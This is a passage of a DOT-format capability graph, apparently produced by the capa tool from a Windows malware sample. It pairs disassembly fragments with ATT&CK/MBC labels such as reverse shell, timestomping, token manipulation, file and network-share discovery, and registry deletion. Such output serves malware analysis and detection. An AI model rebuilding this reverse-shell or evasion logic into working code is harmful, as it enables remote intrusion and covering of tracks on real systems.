		label="['modify access privileges']",
		location="[4207166]",
		mbc_id="['T1134']",
		mbc_title="['Privilege Escalation::Access Token Manipulation']",
		start_ea=4207143,
		style=filled];
	366 -> 367	[key=0,
		color=red,
		label=false];
	371	[capa_id="['C0065']",
		capa_node=True,
		capa_title="['open process']",
		end_ea=4207261,
		fill=red,
		instruction_sets="sub_403275:\lpush    ebp\lmov     ebp, esp\lsub     esp, 21Ch\lpush    ebx\lpush    esi\lpush    edi\lmov     edi, ds:OpenProcess\lpush    [\
ebp+arg_0]\lxor     ebx, ebx\lpush    ebx\lpush    [ebp+arg_4]\lcall    edi ; OpenProcess\lcmp     eax, ebx\lmov     [ebp+var_C], \
eax\ljnz     loc_4033AA\l",
		is_top_node=True,
		label="['open process']",
		location="[4207248]",
		mbc_id="['C0065']",
		mbc_title="['Process::Open Process']",
		start_ea=4207221,
		style=filled];
	411	[capa_id="['T1033']",
		capa_node=True,
		capa_title="['get session user name']",
		end_ea=4208168,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_120]\lpush    eax\llea     eax, [ebp+var_644]\lpush    eax\lcall    strcpy\llea     eax, [ebp+var_344]\lpush    \
5Ch ; '\\'\lpush    eax\lmov     [ebp+var_18], 100h\lcall    ds:strrchr\linc     eax\lpush    eax\llea     eax, [ebp+var_744]\lpush    \
eax\lcall    strcpy\llea     eax, [ebp+var_744]\lpush    eax\llea     eax, [ebp+var_344]\lpush    eax\lcall    strcpy\ladd     esp, \
20h\llea     eax, [ebp+var_18]\lpush    eax\llea     eax, [ebp+var_444]\lpush    eax\lcall    ds:GetUserNameA\l",
		is_top_node=False,
		label="['get session user name']",
		location="[4208162]",
		mbc_id="['T1033']",
		mbc_title="['Discovery::System Owner/User Discovery']",
		start_ea=4208074,
		style=filled];
	411 -> 411	[key=0];
	481	[capa_id="['E1083', 'E1083']",
		capa_node=True,
		capa_title="['enumerate files on windows', 'enumerate files on windows']",
		end_ea=4209686,
		fill=red,
		instruction_sets="sub_403BF2:\lpush    ebp\lmov     ebp, esp\lsub     esp, 140h\lpush    esi\llea     eax, [ebp+var_140]\lpush    edi\lpush    eax\lpush    [\
ebp+arg_0]\lxor     edi, edi\lcall    ds:FindFirstFileA\lmov     esi, eax\lcmp     esi, 0FFFFFFFFh\ljz      short loc_403C58\l",
		is_top_node=True,
		label="['enumerate files on windows', 'enumerate files on windows']",
		location="[4209650, 4209673]",
		mbc_id="['E1083', 'E1083']",
		mbc_title="['Discovery::File and Directory Discovery', 'Discovery::File and Directory Discovery']",
		start_ea=4209650,
		style=filled];
	485	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files on windows']",
		end_ea=4209731,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_140]\lpush    eax\lpush    esi\lcall    ds:FindNextFileA\ltest    eax, eax\ljz      short loc_403C51\l",
		is_top_node=False,
		label="['enumerate files on windows']",
		location="[4209721]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4209713,
		style=filled];
	481 -> 485	[key=0,
		color=red,
		label=false];
	485 -> 485	[key=0,
		color=red,
		label=false];
	488	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files on windows']",
		end_ea=4209752,
		fill=red,
		instruction_sets="push    esi\lcall    ds:FindClose\l",
		is_top_node=False,
		label="['enumerate files on windows']",
		location="[4209746]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4209745,
		style=filled];
	485 -> 488	[key=0,
		color=darkgreen,
		label=true];
	515	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files recursively']",
		end_ea=4210072,
		fill=red,
		instruction_sets="sub_403D7F:\lpush    ebp\lmov     ebp, esp\lsub     esp, 844h\lcmp     dword_407E70, 0\lpush    ebx\lpush    esi\lpush    edi\ljnz     \
loc_403FB6\l",
		is_top_node=True,
		label="['enumerate files recursively']",
		location="[4210047]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4210047,
		style=filled];
	516	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files recursively']",
		end_ea=4210130,
		fill=red,
		instruction_sets="push    [ebp+arg_0]\lmov     esi, ds:sprintf\llea     eax, [ebp+var_844]\lpush    offset aS; \"%s\\\\*.*\"\lpush    eax\lcall    esi ; \
sprintf\ladd     esp, 0Ch\llea     eax, [ebp+var_144]\lpush    eax\llea     eax, [ebp+var_844]\lpush    eax\lcall    ds:FindFirstFileA\lcmp     \
eax, 0FFFFFFFFh\lmov     [ebp+var_4], eax\ljz      loc_403FA3\l",
		is_top_node=False,
		label="['enumerate files recursively']",
		location="[4210112]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4210072,
		style=filled];
	515 -> 516	[key=0,
		color=red,
		label=false];
	518	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files recursively']",
		end_ea=4210165,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_144]\lpush    eax\lpush    [ebp+var_4]\lcall    ds:FindNextFileA\ltest    eax, eax\ljz      loc_403F9A\l",
		is_top_node=False,
		label="['enumerate files recursively']",
		location="[4210151]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4210141,
		style=filled];
	516 -> 518	[key=0,
		color=red,
		label=false];
	544	[capa_id="['C0048']",
		capa_node=True,
		capa_title="['delete directory']",
		end_ea=4210614,
		fill=red,
		instruction_sets="push    [ebp+arg_0]\lcall    ds:RemoveDirectoryA\ltest    eax, eax\ljnz     short loc_403FBA\l",
		is_top_node=False,
		label="['delete directory']",
		location="[4210604]",
		mbc_id="['C0048']",
		mbc_title="['File System::Delete Directory']",
		start_ea=4210601,
		style=filled];
	516 -> 544	[key=0,
		color=darkgreen,
		label=true];
	518 -> 518	[key=0,
		color=red,
		label=false];
	534	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files recursively']",
		end_ea=4210454,
		fill=red,
		instruction_sets="push    0EA60h\lpush    dword_407E5C\lcall    edi ; WaitForSingleObject\lcmp     eax, ebx\ljz      short loc_403F8F\l",
		is_top_node=False,
		label="['enumerate files recursively']",
		location="[4210448]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4210437,
		style=filled];
	518 -> 534	[key=0,
		color=red,
		label=false];
	541	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['enumerate files recursively']",
		end_ea=4210586,
		fill=red,
		instruction_sets="push    [ebp+var_4]\lcall    ds:FindClose\ljmp     short loc_403FB6\l",
		is_top_node=False,
		label="['enumerate files recursively']",
		location="[4210578]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4210575,
		style=filled];
	518 -> 541	[key=0,
		color=red,
		label=false];
	518 -> 544	[key=0,
		color=darkgreen,
		label=true];
	534 -> 518	[key=0,
		color=red,
		label=false];
	534 -> 541	[key=0,
		color=darkgreen,
		label=true];
	574	[capa_id="['C0051', 'C0051']",
		capa_node=True,
		capa_title="['read file on Windows', 'read file on Windows']",
		end_ea=4211447,
		fill=red,
		instruction_sets="xor     edi, edi\lpush    edi\lpush    80h ; '€'\lpush    3\lpush    edi\lpush    3\lpush    80000000h\lpush    [ebp+arg_4]\lcall    \
ds:CreateFileA\lmov     esi, eax\lcmp     esi, 0FFFFFFFFh\ljnz     short loc_40432D\l",
		is_top_node=False,
		label="['read file on Windows', 'read file on Windows']",
		location="[4211434, 4211426]",
		mbc_id="['C0051', 'C0051']",
		mbc_title="['File System::Read File', 'File System::Read File']",
		start_ea=4211413,
		style=filled];
	578	[capa_id="['E1083']",
		capa_node=True,
		capa_title="['get file size']",
		end_ea=4211550,
		fill=red,
		instruction_sets="push    edi\lpush    esi\lcall    ds:GetFileSize\lpush    5\lpop     ecx\lsub     ecx, [ebp+arg_0]\lpush    esi\ladd     eax, ecx\lmov     [\
ebp+var_2007], eax\lcall    ds:CloseHandle\llea     eax, [ebp+var_2008]\lpush    5\lpush    eax\lcall    sub_401F87\lpop     ecx\ltest    \
eax, eax\lpop     ecx\ljnz     short loc_404365\l",
		is_top_node=False,
		label="['get file size']",
		location="[4211503]",
		mbc_id="['E1083']",
		mbc_title="['Discovery::File and Directory Discovery']",
		start_ea=4211501,
		style=filled];
	574 -> 578	[key=0,
		color=darkgreen,
		label=true];
	582	[capa_id="['C0051']",
		capa_node=True,
		capa_title="['read file on Windows']",
		end_ea=4211666,
		fill=red,
		instruction_sets="push    [ebp+var_8]\llea     eax, [ebp+var_2008]\lpush    esi\lpush    1\lpush    eax\lcall    ds:fread\lmov     ebx, eax\llea     \
eax, [ebp+arg_0]\lpush    eax\llea     eax, [ebp+var_2008]\lpush    eax\llea     eax, [ebp+var_2008]\lpush    esi\lpush    eax\lcall    \
sub_402826\llea     eax, [ebp+var_2008]\lpush    ebx\lpush    eax\lcall    sub_401EE7\ladd     esp, 28h\ltest    eax, eax\ljz      \
short loc_4043DE\l",
		is_top_node=False,
		label="['read file on Windows']",
		location="[4211614]",
		mbc_id="['C0051']",
		mbc_title="['File System::Read File']",
		start_ea=4211601,
		style=filled];
	578 -> 582	[key=0,
		color=darkgreen,
		label=true];
	582 -> 582	[key=0,
		color=red,
		label=false];
	634	[capa_id="['T1070.006', 'T1070.006']",
		capa_node=True,
		capa_title="['timestomp file', 'timestomp file']",
		end_ea=4212868,
		fill=red,
		instruction_sets="push    edi\llea     eax, [ebp+var_C]\lpush    edi\lpush    eax\lpush    [ebp+var_4]\lcall    ds:GetFileTime\llea     eax, [ebp+\
var_C]\lpush    eax\llea     eax, [ebp+var_C]\lpush    eax\llea     eax, [ebp+var_C]\lpush    eax\lpush    ebx\lcall    ds:SetFileTime\lpush    [\
ebp+var_4]\lmov     esi, ds:CloseHandle\lcall    esi ; CloseHandle\lpush    ebx\lcall    esi ; CloseHandle\lpush    [ebp+arg_0]\lcall    \
ds:GetFileAttributesA\lor      al, 2\lpush    eax\lpush    [ebp+arg_0]\lcall    ds:SetFileAttributesA\l",
		is_top_node=False,
		label="['timestomp file', 'timestomp file']",
		location="[4212827, 4212808]",
		mbc_id="['T1070.006', 'T1070.006']",
		mbc_title="['Defense Evasion::Indicator Removal::Timestomp', 'Defense Evasion::Indicator Removal::Timestomp']",
		start_ea=4212799,
		style=filled];
	640	[capa_id="['T1135']",
		capa_node=True,
		capa_title="['enumerate network shares']",
		end_ea=4213101,
		fill=red,
		instruction_sets="sub_404905:\lpush    ebp\lmov     ebp, esp\lmov     eax, 4240h\lcall    __alloca_probe\lpush    ebx\lpush    esi\lpush    edi\lpush    \
2\lor      [ebp+var_14], 0FFFFFFFFh\lpop     edi\lpush    offset asc_40797C; \"\\\\\\\\\\\\\"\lxor     ebx, ebx\lpush    dword_407E8C\lmov     [\
ebp+var_3C], edi\lmov     [ebp+var_38], ebx\lmov     [ebp+var_34], 3\lmov     [ebp+var_30], edi\lmov     [ebp+var_2C], ebx\lmov     [\
ebp+var_28], ebx\lmov     [ebp+var_24], ebx\lmov     [ebp+var_20], ebx\lmov     [ebp+var_8], ebx\lmov     [ebp+var_10], 4000h\lmov     [\
ebp+var_4], 5\lmov     byte ptr [ebp+var_4240], 47h ; 'G'\lcall    ds:strstr\lpop     ecx\lmov     esi, eax\lpop     ecx\lcmp     \
esi, ebx\lpush    5Ch ; '\\'\ljz      short loc_4049B9\l",
		is_top_node=True,
		label="['enumerate network shares']",
		location="[4212997]",
		mbc_id="['T1135']",
		mbc_title="['Discovery::Network Share Discovery']",
		start_ea=4212997,
		style=filled];
	655	[capa_id="['T1135']",
		capa_node=True,
		capa_title="['enumerate network shares']",
		end_ea=4213362,
		fill=red,
		instruction_sets="push    [ebp+var_10]\lpush    ebx\lpush    edi\lcall    memset\ladd     esp, 0Ch\llea     eax, [ebp+var_10]\lpush    eax\llea     \
eax, [ebp+var_14]\lpush    edi\lpush    eax\lpush    [ebp+var_18]\lcall    WNetEnumResourceA\lcmp     eax, ebx\ljnz     loc_404B23\l",
		is_top_node=False,
		label="['enumerate network shares']",
		location="[4213349]",
		mbc_id="['T1135']",
		mbc_title="['Discovery::Network Share Discovery']",
		start_ea=4213324,
		style=filled];
	640 -> 655	[key=0,
		color=red,
		label=false];
	655 -> 655	[key=0,
		color=red,
		label=false];
	760	[capa_id="['C0017']",
		capa_node=True,
		capa_title="['create process on Windows']",
		end_ea=4215276,
		fill=red,
		instruction_sets="push    44h ; 'D'\llea     eax, [ebp+var_54]\lpush    ebx\lpush    eax\lcall    memset\ladd     esp, 0Ch\llea     eax, [ebp+var_\
10]\lmov     [ebp+var_28], 1\lmov     [ebp+var_24], bx\lpush    eax\llea     eax, [ebp+var_54]\lpush    eax\lpush    ebx\lpush    \
ebx\lpush    ebx\lpush    ebx\lpush    ebx\lpush    ebx\lpush    [ebp+arg_0]\lpush    ebx\lcall    ds:CreateProcessA\lpop     edi\lpop     \
esi\lpop     ebx\lleave\lretn\l",
		is_top_node=False,
		label="['create process on Windows']",
		location="[4215265]",
		mbc_id="['C0017']",
		mbc_title="['Process::Create Process']",
		start_ea=4215221,
		style=filled];
	764	[capa_id="['C0003.001', 'C0003.001', 'C0003.004', 'T1059.003', 'B0022.001', 'C0002.003', 'C0003.004', 'T1059.003', 'B0023', 'B0030.003', '\
B0022.001', 'C0017', 'T1059.003', 'B0023', 'B0022.001', 'C0017', 'T1059.003', 'B0023', 'B0022.001', 'C0017', 'T1059.003', 'B0023', '\
B0022.001', 'T1059.003']",
		capa_node=True,
		capa_title="['create pipe', 'create two anonymous pipes', 'write pipe', 'execute shell command and capture output', 'create reverse shell', '\
receive and write data from server to client', 'send HTTP request', 'write pipe', 'execute shell command and capture output', 'write \
and execute a file', 'download and write a file', 'create reverse shell', 'read and send data from client to server', 'create a \
process with modified I/O handles and window', 'execute shell command and capture output', 'write and execute a file', 'create reverse \
shell', 'create a process with modified I/O handles and window', 'execute shell command and capture output', 'write and execute \
a file', 'create reverse shell', 'create a process with modified I/O handles and window', 'execute shell command and capture output', '\
write and execute a file', 'create reverse shell', 'execute shell command and capture output']",
		end_ea=4215558,
		fill=red,
		instruction_sets="sub_405224:\lpush    ebp\lmov     ebp, esp\lmov     eax, 1540h\lcall    __alloca_probe\lpush    ebx\lpush    esi\lpush    edi\lpush    \
offset aKernel32Dll_0; \"Kernel32.dll\"\lcall    ds:LoadLibraryA\lpush    offset aTerminateproce; \"TerminateProcess\"\lpush    eax\lcall    \
ds:GetProcAddress\lpush    1\lmov     [ebp+var_14], eax\lxor     esi, esi\lpop     ebx\llea     eax, [ebp+var_2C]\lmov     edi, \
ds:CreatePipe\lor      [ebp+var_8], 0FFFFFFFFh\lpush    esi\lpush    eax\llea     eax, [ebp+var_1C]\lpush    eax\llea     eax, [\
ebp+var_10]\lpush    eax\lmov     [ebp+var_4], esi\lmov     dword_4086B0, ebx\lmov     [ebp+var_2C], 0Ch\lmov     [ebp+var_28], \
esi\lmov     [ebp+var_24], ebx\lcall    edi ; CreatePipe\llea     eax, [ebp+var_2C]\lpush    esi\lpush    eax\llea     eax, [ebp+\
var_18]\lpush    eax\llea     eax, [ebp+var_20]\lpush    eax\lcall    edi ; CreatePipe\lpush    44h ; 'D'\llea     eax, [ebp+var_\
88]\lpush    esi\lpush    eax\lcall    memset\lmov     eax, [ebp+var_20]\ladd     esp, 0Ch\lmov     [ebp+var_50], eax\lmov     eax, [\
ebp+var_1C]\lmov     [ebp+var_48], eax\lmov     [ebp+var_4C], eax\lmov     eax, dword_407D34\lmov     [ebp+var_5C], 101h\lmov     [\
ebp+var_34], eax\lmov     eax, dword_407D38\lmov     [ebp+var_30], eax\llea     eax, [ebp+var_44]\lpush    eax\llea     eax, [ebp+\
var_88]\lpush    eax\lpush    esi\lpush    esi\lpush    esi\lpush    ebx\lpush    esi\llea     eax, [ebp+var_34]\lpush    esi\lpush    \
eax\lpush    esi\lmov     [ebp+var_58], si\lcall    ds:CreateProcessA\lmov     ebx, ds:Sleep\lpush    3E8h\lcall    ebx ; Sleep\lcall    \
sub_40551C\lcmp     eax, esi\lmov     [ebp+var_C], eax\ljz      loc_405505\l",
		is_top_node=True,
		label="['create pipe', 'create two anonymous pipes', 'write pipe', 'execute shell command and capture output', 'create reverse shell', '\
receive and write data from server to client', 'send HTTP request', 'write pipe', 'execute shell command and capture output', 'write \
and execute a file', 'download and write a file', 'create reverse shell', 'read and send data from client to server', 'create a \
process with modified I/O handles and window', 'execute shell command and capture output', 'write and execute a file', 'create reverse \
shell', 'create a process with modified I/O handles and window', 'execute shell command and capture output', 'write and execute \
a file', 'create reverse shell', 'create a process with modified I/O handles and window', 'execute shell command and capture output', '\
write and execute a file', 'create reverse shell', 'execute shell command and capture output']",
		location="[4215424, 4215332, 4215441, 4215523, 4215479, 4215474]",
		mbc_id="['C0003.001', 'C0003.001', 'C0003.004', 'T1059.003', 'B0022.001', 'C0002.003', 'C0003.004', 'T1059.003', 'B0023', 'B0030.003', '\
B0022.001', 'C0017', 'T1059.003', 'B0023', 'B0022.001', 'C0017', 'T1059.003', 'B0023', 'B0022.001', 'C0017', 'T1059.003', 'B0023', '\
B0022.001', 'T1059.003']",
		mbc_title="['Communication::Interprocess Communication::Create Pipe', 'Communication::Interprocess Communication::Create Pipe', 'Communication::\
Interprocess Communication::Write Pipe', 'Execution::Command and Scripting Interpreter::Windows Command Shell', 'Impact::Remote \
Access::Reverse Shell', 'Communication::HTTP Communication::Send Request', 'Communication::Interprocess Communication::Write Pipe', '\
Execution::Command and Scripting Interpreter::Windows Command Shell', 'Execution::Install Additional Program', 'Command and Control::\
C2 Communication::Server to Client File Transfer', 'Impact::Remote Access::Reverse Shell', 'Process::Create Process', 'Execution::\
Command and Scripting Interpreter::Windows Command Shell', 'Execution::Install Additional Program', 'Impact::Remote Access::Reverse \
Shell', 'Process::Create Process', 'Execution::Command and Scripting Interpreter::Windows Command Shell', 'Execution::Install Additional \
Program', 'Impact::Remote Access::Reverse Shell', 'Process::Create Process', 'Execution::Command and Scripting Interpreter::Windows \
Command Shell', 'Execution::Install Additional Program', 'Impact::Remote Access::Reverse Shell', 'Execution::Command and Scripting \
Interpreter::Windows Command Shell']",
		start_ea=4215332,
		style=filled];
	766	[capa_id="['C0002.003']",
		capa_node=True,
		capa_title="['send HTTP request', 'read and send data from client to server']",
		end_ea=4215573,
		fill=red,
		instruction_sets="push    offset aConnectThrough; \"!!Connect Through HTTP Tunnel!!\\n\"\ljmp     short loc_40531A\l",
		is_top_node=False,
		label="['send HTTP request', 'read and send data from client to server']",
		location="[4215566]",
		mbc_id="['C0002.003']",
		mbc_title="['Communication::HTTP Communication::Send Request']",
		start_ea=4215566,
		style=filled];
	764 -> 766	[key=0,
		color=red,
		label=false];
	768	[capa_id="['C0002.003']",
		capa_node=True,
		capa_title="['send HTTP request', 'read and send data from client to server']",
		end_ea=4215749,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_188]\lpush    eax\lcall    strcpy\lpop     ecx\llea     eax, [ebp+var_188]\lpop     ecx\lpush    eax\lcall    \
strlen\lpop     ecx\ladd     eax, 4\lpush    eax\lpush    1\lpush    offset unk_4089F0\lpush    50h ; 'P'\lpush    dword_407F24\lcall    \
ds:inet_ntoa\lpush    eax\llea     eax, [ebp+var_D40]\lpush    eax\lcall    sub_402673\llea     eax, [ebp+var_D40]\lpush    eax\lcall    \
strlen\lmov     edi, eax\llea     eax, [ebp+var_188]\lpush    eax\lcall    strlen\lmov     [ebp+edi+var_D40], eax\llea     eax, [\
ebp+var_188]\lpush    eax\ladd     edi, 4\lcall    strlen\lpush    eax\llea     eax, [ebp+var_188]\lpush    eax\llea     eax, [ebp+\
edi+var_D40]\lpush    eax\lcall    memcpy\llea     eax, [ebp+var_188]\lpush    eax\lcall    strlen\ladd     esp, 34h\ladd     edi, \
eax\llea     eax, [ebp+var_D40]\lpush    esi\lpush    edi\lpush    eax\lpush    [ebp+var_C]\lcall    ds:send\lpush    64h ; 'd'\l",
		is_top_node=False,
		label="['send HTTP request', 'read and send data from client to server']",
		location="[4215741]",
		mbc_id="['C0002.003']",
		mbc_title="['Communication::HTTP Communication::Send Request']",
		start_ea=4215578,
		style=filled];
	764 -> 768	[key=0,
		color=red,
		label=false];
	766 -> 768	[key=0];
	769	[capa_id="['C0003.003', 'T1059.003', 'B0022.001']",
		capa_node=True,
		capa_title="['read pipe', 'execute shell command and capture output', 'create reverse shell']",
		end_ea=4215787,
		fill=red,
		instruction_sets="call    ebx ; Sleep\lpush    esi\llea     eax, [ebp+var_4]\lpush    esi\lpush    eax\llea     eax, [ebp+var_1540]\lpush    800h\lpush    \
eax\lpush    [ebp+var_10]\lcall    ds:PeekNamedPipe\lcmp     [ebp+var_4], esi\ljz      loc_40548D\l",
		is_top_node=False,
		label="['read pipe', 'execute shell command and capture output', 'create reverse shell']",
		location="[4215772]",
		mbc_id="['C0003.003', 'T1059.003', 'B0022.001']",
		mbc_title="['Communication::Interprocess Communication::Read Pipe', 'Execution::Command and Scripting Interpreter::Windows Command Shell', '\
Impact::Remote Access::Reverse Shell']",
		start_ea=4215749,
		style=filled];
	768 -> 769	[key=0];
	770	[capa_id="['C0003.003', 'T1059.003', 'B0022.001']",
		capa_node=True,
		capa_title="['read pipe', 'execute shell command and capture output', 'create reverse shell', 'read and send data from client to server']",
		end_ea=4215819,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_4]\lpush    esi\lpush    eax\llea     eax, [ebp+var_1540]\lpush    [ebp+var_4]\lpush    eax\lpush    [ebp+\
var_10]\lcall    ds:ReadFile\ltest    eax, eax\ljz      loc_4054FC\l",
		is_top_node=False,
		label="['read pipe', 'execute shell command and capture output', 'create reverse shell', 'read and send data from client to server']",
		location="[4215805]",
		mbc_id="['C0003.003', 'T1059.003', 'B0022.001']",
		mbc_title="['Communication::Interprocess Communication::Read Pipe', 'Execution::Command and Scripting Interpreter::Windows Command Shell', '\
Impact::Remote Access::Reverse Shell']",
		start_ea=4215787,
		style=filled];
	769 -> 770	[key=0,
		color=red,
		label=false];
	782	[capa_id="['B0030.003']",
		capa_node=True,
		capa_title="['receive and write data from server to client', 'download and write a file']",
		end_ea=4216031,
		fill=red,
		instruction_sets="push    esi\lpush    eax\llea     eax, [ebp+var_1540]\lpush    eax\lpush    [ebp+var_C]\lcall    ds:recv\lcmp     eax, esi\ljle     \
short loc_4054FC\l",
		is_top_node=False,
		label="['receive and write data from server to client', 'download and write a file']",
		location="[4216021]",
		mbc_id="['B0030.003']",
		mbc_title="['Command and Control::C2 Communication::Server to Client File Transfer']",
		start_ea=4216009,
		style=filled];
	769 -> 782	[key=0,
		color=darkgreen,
		label=true];
	770 -> 769	[key=0,
		color=red,
		label=false];
	783	[capa_id="['C0003.004', 'B0023', 'B0030.003', 'B0022.001']",
		capa_node=True,
		capa_title="['receive and write data from server to client', 'write pipe', 'write and execute a file', 'download and write a file', 'create \
reverse shell']",
		end_ea=4216060,
		fill=red,
		instruction_sets="sub     [ebp+var_8], eax\llea     ecx, [ebp+var_4]\lpush    esi\lpush    ecx\lpush    eax\llea     eax, [ebp+var_1540]\lpush    \
eax\lpush    [ebp+var_18]\lcall    ds:WriteFile\ltest    eax, eax\ljnz     short loc_405486\l",
		is_top_node=False,
		label="['receive and write data from server to client', 'write pipe', 'write and execute a file', 'download and write a file', 'create \
reverse shell']",
		location="[4216050]",
		mbc_id="['C0003.004', 'B0023', 'B0030.003', 'B0022.001']",
		mbc_title="['Communication::Interprocess Communication::Write Pipe', 'Execution::Install Additional Program', 'Command and Control::C2 Communication::\
Server to Client File Transfer', 'Impact::Remote Access::Reverse Shell']",
		start_ea=4216031,
		style=filled];
	782 -> 783	[key=0,
		color=red,
		label=false];
	783 -> 769	[key=0,
		color=darkgreen,
		label=true];
	804	[capa_id="['C0036.005', 'C0036.005']",
		capa_node=True,
		capa_title="['query or enumerate registry key', 'query or enumerate registry key']",
		end_ea=4216666,
		fill=red,
		instruction_sets="sub_405733:\lpush    ebp\lmov     ebp, esp\lpush    ecx\lpush    ebx\llea     eax, [ebp+arg_4]\lpush    esi\lxor     ebx, ebx\lpush    \
eax\lpush    0F003Fh\lpush    ebx\lmov     [ebp+var_4], ebx\lpush    [ebp+arg_4]\lxor     esi, esi\lpush    [ebp+arg_0]\lcall    \
ds:RegOpenKeyExA\ltest    eax, eax\ljz      short loc_40575E\l",
		is_top_node=True,
		label="['query or enumerate registry key', 'query or enumerate registry key']",
		location="[4216656, 4216627]",
		mbc_id="['C0036.005', 'C0036.005']",
		mbc_title="['Operating System::Registry::Query Registry Key', 'Operating System::Registry::Query Registry Key']",
		start_ea=4216627,
		style=filled];
	807	[capa_id="['C0036.005']",
		capa_node=True,
		capa_title="['query or enumerate registry key']",
		end_ea=4216709,
		fill=red,
		instruction_sets="mov     eax, [ebp+arg_8]\lpush    ebx\lpush    ebx\lpush    ebx\llea     edi, [esi+eax]\llea     eax, [ebp+arg_0]\lpush    ebx\lpush    \
eax\lpush    edi\lmov     [ebp+arg_0], 104h\lpush    [ebp+var_4]\lpush    [ebp+arg_4]\lcall    ds:RegEnumKeyExA\ltest    eax, eax\ljnz     \
short loc_405795\l",
		is_top_node=False,
		label="['query or enumerate registry key']",
		location="[4216699]",
		mbc_id="['C0036.005']",
		mbc_title="['Operating System::Registry::Query Registry Key']",
		start_ea=4216671,
		style=filled];
	804 -> 807	[key=0,
		color=darkgreen,
		label=true];
	807 -> 807	[key=0,
		color=red,
		label=false];
	818	[capa_id="['C0036.002', 'C0036.002']",
		capa_node=True,
		capa_title="['delete registry key', 'delete registry key']",
		end_ea=4216911,
		fill=red,
		instruction_sets="sub_405831:\lpush    ebp\lmov     ebp, esp\llea     eax, [ebp+arg_4]\lpush    eax\lpush    0F003Fh\lpush    0\lpush    [ebp+arg_\
4]\lpush    [ebp+arg_0]\lcall    ds:RegOpenKeyExA\ltest    eax, eax\ljz      short loc_405853\l",
		is_top_node=True,
		label="['delete registry key', 'delete registry key']",
		location="[4216881, 4216901]",
		mbc_id="['C0036.002', 'C0036.002']",
		mbc_title="['Operating System::Registry::Delete Registry Key', 'Operating System::Registry::Delete Registry Key']",
		start_ea=4216881,
		style=filled];
	820	[capa_id="['C0036.002']",
		capa_node=True,
		capa_title="['delete registry key']",
		end_ea=4216949,
		fill=red,
		instruction_sets="push    esi\lpush    [ebp+arg_8]\lpush    [ebp+arg_4]\lcall    ds:SHDeleteKeyA\lpush    [ebp+arg_4]\lmov     esi, eax\lcall    ds:\
RegCloseKey\lxor     eax, eax\ltest    esi, esi\lsetz    al\lpop     esi\lpop     ebp\lretn\l",
		is_top_node=False,
		label="['delete registry key']",
		location="[4216922]",
		mbc_id="['C0036.002']",
		mbc_title="['Operating System::Registry::Delete Registry Key']",
		start_ea=4216915,
		style=filled];
	818 -> 820	[key=0,
		color=darkgreen,
		label=true];
}
